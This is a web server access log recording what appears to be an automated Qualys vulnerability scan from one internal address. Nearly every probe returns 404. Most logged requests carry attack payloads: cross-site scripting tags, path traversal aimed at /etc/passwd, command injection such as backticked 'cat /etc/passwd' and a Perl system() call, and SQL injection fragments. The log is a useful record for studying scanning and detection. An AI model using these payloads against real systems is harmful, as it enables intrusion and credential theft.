47.150.129.197 - - [02/Apr/2017:09:54:55 +0000] "GET /robots.txt HTTP/1.1" 200 26
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "POST /cgi-bin/wwwboard.pl HTTP/1.1" 404 310
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /admin/modules/blocks.php/admin.php HTTP/1.1" 404 325
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "POST /cgi-bin/whois.cgi HTTP/1.1" 404 308
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/viewcvs.cgi/ccvs/?sortby=rev\"><script>alert(document.domain)</script> HTTP/1.1" 404 316
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/ans/ HTTP/1.1" 404 303
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /ips/ HTTP/1.1" 404 295
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/faqmanager.cgi?toc=/etc/passwd%00 HTTP/1.1" 404 313
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /formmail.pl?recipient=blackhole%40qualys.com HTTP/1.1" 404 302
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/guest.cgi HTTP/1.1" 404 308
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET / HTTP/1.1" 200 55
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/erba/start/%3Cscript%3Ealert(97633);%3C/script%3E HTTP/1.1" 404 352
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "POST /cgi-bin/webwho.pl HTTP/1.1" 404 308
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/ans-2.11/ HTTP/1.1" 404 308
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET boards/ HTTP/1.1" 400 319
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/faqmanager.cgi?toc=faqmanager.cgi%00 HTTP/1.1" 404 313
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/post.cgi HTTP/1.1" 404 307
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "POST /ubb6_test.cgi HTTP/1.1" 404 304
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /index.html HTTP/1.1" 200 55
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/mailreader/ HTTP/1.1" 404 310
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/start.cgi/%3Cscript%3Ealert(97633);%3C/script%3E HTTP/1.1" 404 351
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/classifieds?adPath=/../../../../../etc/passwd%00 HTTP/1.1" 404 310
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /administrator/components/com_videogallerylite/ HTTP/1.1" 404 337
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/faqmanager.cgi?toc=../../../../../../../../etc/passwd%00 HTTP/1.1" 404 313
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /wwwthreads.pl HTTP/1.1" 404 304
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/editparams.cgi HTTP/1.1" 404 313
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /modules.php?name=News&file=friend&op=StorySent&title=%253cscript%3Ealert%2528document.cookie);%253c/script%3E HTTP/1.1" 404 302
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/classifieds.cgi HTTP/1.1" 404 314
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/site_searcher.cgi?page=|ls| HTTP/1.1" 404 316
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/mr2/ HTTP/1.1" 404 303
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /ubbthreads.php HTTP/1.1" 404 305
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/webc HTTP/1.1" 404 303
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "POST /down.asp HTTP/1.1" 404 299
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/cp.cgi HTTP/1.1" 404 305
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /content/administrator/components/com_videogallerylite/ HTTP/1.1" 404 345
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/admin_members.php HTTP/1.1" 404 316
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/classified.cgi HTTP/1.1" 404 313
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/activemail/ HTTP/1.1" 404 310
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/webc.cgi HTTP/1.1" 404 307
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /index.php/123 HTTP/1.1" 404 304
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /Content/administrator/components/com_videogallerylite/ HTTP/1.1" 404 345
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /RELEASE-NOTES HTTP/1.1" 404 304
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/YaBB.cgi HTTP/1.1" 404 307
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/admin_config.php HTTP/1.1" 404 315
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/classifieds/classifieds?adPath=/../../../../../etc/passwd%00 HTTP/1.1" 404 322
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/powerup/ HTTP/1.1" 404 307
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/webc.exe HTTP/1.1" 404 307
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "OPTIONS /index.php HTTP/1.1" 404 300
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/YaBB.pl HTTP/1.1" 404 306
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /CMS/administrator/components/com_videogallerylite/ HTTP/1.1" 404 341
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /imagewin.php?file=\"><script>alert(document.cookie)</script> HTTP/1.1" 404 303
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/admin_cat.php HTTP/1.1" 404 312
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/classifieds/classifieds.cgi HTTP/1.1" 404 326
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/vpopmail/ HTTP/1.1" 404 308
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /coregui/ HTTP/1.1" 404 299
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/superguestconfig HTTP/1.1" 404 315
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /. HTTP/1.1" 200 55
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/vote.cgi?type=../qualystest&value=../qualystest HTTP/1.1" 404 307
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /view.php?gid=1&phid=0&img_size=%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1" 404 299
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/admin_forum.php HTTP/1.1" 404 314
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/namazu/ HTTP/1.1" 404 306
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/classified/classified.cgi HTTP/1.1" 404 324
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/ikonboard.cgi HTTP/1.1" 404 312
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /x2engine/ HTTP/1.1" 404 300
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /add_user.php HTTP/1.1" 404 303
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /include/footer.php?t_login=<script>alert(document.cookie)</script> HTTP/1.1" 404 309
10.79.217.2 - - [04/Apr/2017:18:50:24 +0000] "GET /cgi-bin/index.cgi?month=../qualystest&year=../qualystest HTTP/1.1" 404 308
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/nph-mr.cgi HTTP/1.1" 404 309
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/webbbs_files/ HTTP/1.1" 404 312
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/index.cgi?image_list=alternative_image.list&html_file=../../../../../etc/passwd HTTP/1.1" 404 308
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/shop.plx/page=QualysGSTest HTTP/1.1" 404 325
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /main.php HTTP/1.1" 404 299
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /x2crm/ HTTP/1.1" 404 297
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/classifieds.cgi?catagory=../qualystest HTTP/1.1" 404 314
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /bug_sponsorship_list_view_inc.php?t_core_path=../../../../etc/passwd%00 HTTP/1.1" 404 324
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/webmail.cgi HTTP/1.1" 404 310
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/webbbs-5.11/ HTTP/1.1" 404 311
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/counter/nl/ord/lang=english(1);system(\"$ENV{HTTP_X}\"); HTTP/1.1" 404 363
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/album.pl?function=about HTTP/1.1" 404 307
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /X2Engine/ HTTP/1.1" 404 300
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /default.asp HTTP/1.1" 404 302
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /hints.pl?|id| HTTP/1.1" 404 299
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/quiz.cgi?quiz=quiz&total=10&mode=grademe HTTP/1.1" 404 307
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/w3mail/ HTTP/1.1" 404 306
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/no5_such3_file7.cgi HTTP/1.1" 404 318
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/counter/nl/ord/lang=english(1);system(\"$ENV{HTTP_X}\"); HTTP/1.1" 404 363
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/nph-exploitscanget.cgi?host=`cat%20/etc/passwd`&port=443&errchk=0&idsbypass=0 HTTP/1.1" 404 321
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/FormMail.pl?env_report=PATH&recipient=blackhole@qualys.com&required=&firstname=&lastname=&email=&message=&Submit= HTTP/1.1" 404 310
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /x2Crm/ HTTP/1.1" 404 297
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /recipe_view.php?intId=char%2839%29%2b%28SELECT HTTP/1.1" 404 306
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /usr/root/usrinfo.xml HTTP/1.1" 404 311
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/W3Mail-1.0.6/ HTTP/1.1" 404 312
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/no5_such3_file7.pl HTTP/1.1" 404 317
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/nph-exploitscanget.cgi?host=%3Cscript%3Ealert%28QualysTest%29%3C%2Fscript%3E&port=80&idsbypass=0&errchk=1 HTTP/1.1" 404 321
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/finger HTTP/1.1" 404 305
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/formmail.pl?env_report=PATH&recipient=blackhole@qualys.com&required=&firstname=&lastname=&email=&message=&Submit= HTTP/1.1" 404 310
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /recipe_search.php?searchstring=<script>alert(document.domain);</script> HTTP/1.1" 404 308
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /x2ENGINE HTTP/1.1" 404 299
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /Documentation/tests/bug-559668.php?FORUM[LIB]=../../../../../../../etc/passwd%00 HTTP/1.1" 404 325
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/no5_such3_file7.php HTTP/1.1" 404 318
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/dispair-0.3/ HTTP/1.1" 404 311
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/parse-file?TEMPLATE=%3Cscript%3Ealert('QualysXSSTest')%3C/script%3E HTTP/1.1" 404 309
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/finger.cgi HTTP/1.1" 404 309
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "POST /cgi-bin/admin.php HTTP/1.1" 404 308
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /no5_such3_file7.pl?\"><script>alert(73541);</script> HTTP/1.1" 404 309
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /main.html HTTP/1.1" 404 300
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /x2CRM/ HTTP/1.1" 404 297
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/csGuestbook.cgi?command=savesetup&setup=/ HTTP/1.1" 404 314
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/mojo/ HTTP/1.1" 404 304
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/finger.pl HTTP/1.1" 404 308
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/parse-file?TEMPLATE=QualysPDTest HTTP/1.1" 404 309
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/fom?cmd=<script>alert(\"hello\")</script> HTTP/1.1" 404 302
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /no5_such3_file7.cgi?\"><script>alert(73541);</script> HTTP/1.1" 404 310
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "PUT /test_put_qualysYbjSZ3rp HTTP/1.1" 405 337
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /X2Crm/ HTTP/1.1" 404 297
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/csSearch.cgi?command=savesetup&setup=/ HTTP/1.1" 404 311
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/MOJO/ HTTP/1.1" 404 304
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/filemail.pl HTTP/1.1" 404 310
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/anyboard.cgi/?cmd=sinfo&all=1 HTTP/1.1" 404 312
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/mmstdod.cgi?ALTERNATE_TEMPLATES=/etc/passwd%00 HTTP/1.1" 404 310
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /no5_such3_file7.php?\"><script>alert(73541);</script> HTTP/1.1" 404 310
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /X2ENGINE/ HTTP/1.1" 404 300
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /jmx-console/ HTTP/1.1" 404 303
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/empower?DB=no3_sucing7 HTTP/1.1" 404 306
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/store/ HTTP/1.1" 404 305
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/FILEMAIL.PL HTTP/1.1" 404 310
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/mailman/mmstdod.cgi?ALTERNATE_TEMPLATES=/etc/passwd%00 HTTP/1.1" 404 318
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/gbrowse?help=../../../../../../../../../../../../../../../etc/passwd%00 HTTP/1.1" 404 306
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /sewse.exe HTTP/1.1" 404 300
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /X2CRM/ HTTP/1.1" 404 297
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /web-console/ HTTP/1.1" 404 303
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/search.cgi?keys=*&prc=any&catigory=../../../../../../../../../../../../etc HTTP/1.1" 404 309
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/filemail.cgi HTTP/1.1" 404 311
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/bonsai/ HTTP/1.1" 404 306
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/com.endymion.sake.servlet.mail.MailServlet?cmd_help=1&param_name=/etc/passwd%00 HTTP/1.1" 404 341
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/esp?PAGE=%3Cscript%3Ealert(12345)%3C/script%3E HTTP/1.1" 404 302
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /sewse.cgi HTTP/1.1" 404 300
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /sysPass/ HTTP/1.1" 404 299
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "PUT /jmx-console/index.jsp HTTP/1.1" 405 335
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/emumail.cgi?user_name=<script>alert(@)</script> HTTP/1.1" 404 310
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/FILEMAIL.CGI HTTP/1.1" 404 311
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/cutecast/members/ HTTP/1.1" 404 316
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "POST /login.php HTTP/1.1" 404 300
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/order.dll HTTP/1.1" 404 308
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /syspass/ HTTP/1.1" 404 299
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/lednews.cgi HTTP/1.1" 404 310
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /sewse.cgi HTTP/1.1" 404 300
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/ans.pl?p=../../../../../bin/perl${IFS}-e${IFS}'$command=\"system(\"echo,Qualys,cmd,exec,test\")\";$delim=chr(32);$command=~s/,/$delim/g;print(\"$command\")'| HTTP/1.1" 404 305
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/maillist.pl HTTP/1.1" 404 310
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/csLiveSupport/ HTTP/1.1" 404 313
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "POST /cms/templates/standard/index.php?mode=weblinks HTTP/1.1" 404 323
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/autohtml.php?op=modload&mainfile=x&name=../../../../../../../../../etc/passwd HTTP/1.1" 404 311
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "POST /cgi-bin/traceroute.pl HTTP/1.1" 404 312
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /sewse.exe HTTP/1.1" 404 300
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /SysPass/ HTTP/1.1" 404 299
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/nph-mr.cgi HTTP/1.1" 404 309
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/MAILLIST.PL HTTP/1.1" 404 310
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/csNewsPro/ HTTP/1.1" 404 309
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /moin.wsgi/NonExistantUser?action=edit&template=<script>alert(\"Qualys_XSS\")</script> HTTP/1.1" 404 316
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/NonExistant.cgi HTTP/1.1" 404 314
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /htsearch HTTP/1.1" 404 299
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "POST /cgi-bin/nslookup.pl HTTP/1.1" 404 310
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /Syspass/ HTTP/1.1" 404 299
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/multihtml.pl?multi=/etc/passwd%00html HTTP/1.1" 404 311
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/maillist.cgi HTTP/1.1" 404 311
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/csCharRBox/ HTTP/1.1" 404 310
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET / HTTP/1.1" 200 55
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/NonExistant.pl HTTP/1.1" 404 313
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/launch.jsp?nosucgparam=\"><script>alert(document.cookie)</script> HTTP/1.1" 404 309
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /htsearch HTTP/1.1" 404 299
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /SiteScope HTTP/1.1" 404 300
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/pals-cgi?palsAction=restart&documentName=/etc/passwd HTTP/1.1" 404 307
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/MAILLIST.CGI HTTP/1.1" 404 311
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/story/ HTTP/1.1" 404 305
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /moin.wsgi HTTP/1.1" 404 300
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/NonExistant HTTP/1.1" 404 310
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/.cobalt/alert/service.cgi?service=no_such_serv HTTP/1.1" 404 324
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /h2console/ HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /search.cgi HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/cal_make.pl?p0=../../../../../../../../../etc/passwd%00 HTTP/1.1" 404 310
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/AllManage/ HTTP/1.1" 404 309
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/guestbook.cgi HTTP/1.1" 404 312
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /moin.wsgi/moinmoin/WikiSandBox?rename=\"><script>alert('QualysXSS')</script>&action=AttachFile HTTP/1.1" 404 321
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/NonExistant.cgi HTTP/1.1" 404 314
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/guestbook.php? HTTP/1.1" 404 312
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /DotNetNuke/ HTTP/1.1" 404 302
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /netpad.cgi HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/opendir.php?/etc/passwd HTTP/1.1" 404 310
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/Allmanage/ HTTP/1.1" 404 309
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/guestbook.pl HTTP/1.1" 404 311
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /DNN/ HTTP/1.1" 404 295
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/NonExistant.pl HTTP/1.1" 404 313
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /struts/..%252f..%252f..%252f/WEB-INF/web.xml HTTP/1.1" 404 329
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/gb.php? HTTP/1.1" 404 305
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /webnews.cgi?cmd=display HTTP/1.1" 404 302
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/r.cgi?FILE=../../../../../../../../../../etc/passwd HTTP/1.1" 404 304
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/myphpnuke/ HTTP/1.1" 404 309
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/bb-hostsvc.sh?HOSTSVC=/../../../../../../../../etc/passwd HTTP/1.1" 404 312
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /administrator/components/com_catalog/ HTTP/1.1" 404 328
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/NonExistant HTTP/1.1" 404 310
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /struts/..%252f..%252f/WEB-INF/web.xml HTTP/1.1" 404 324
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/guest.php? HTTP/1.1" 404 308
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /webnews.cgi?cmd=display HTTP/1.1" 404 302
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/r.pl?FILE=../../../../../../../../../../etc/passwd HTTP/1.1" 404 303
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/myphpnuke/admin/sysinfo/includes/ HTTP/1.1" 404 332
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/webfind.exe?keywords=QUALYS HTTP/1.1" 404 310
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /content/administrator/components/com_catalog/ HTTP/1.1" 404 336
10.79.217.2 - - [04/Apr/2017:18:50:25 +0000] "GET /cgi-bin/esp?PAGE=cfyz HTTP/1.1" 404 302
